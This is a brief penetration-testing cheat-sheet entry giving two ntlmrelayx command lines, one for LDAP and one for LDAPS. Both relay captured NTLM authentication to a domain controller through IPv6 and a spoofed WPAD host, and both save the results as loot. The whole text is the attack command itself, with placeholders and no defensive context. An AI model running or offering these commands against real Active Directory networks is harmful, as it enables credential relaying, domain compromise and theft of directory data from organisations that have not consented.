**relay attack thru ntlmrelayx**

```
ntlmrelayx.py -6 -t ldap://<domain.controller.ip> -wh fakewpad.<domain.com> -l <lootname>
```
OR LDAP Secured (LDAPS)

```
ntlmrelayx.py -6 -t ldaps://<domain.controller.ip> -wh fakewpad.<domain.com> -l <lootname>
```

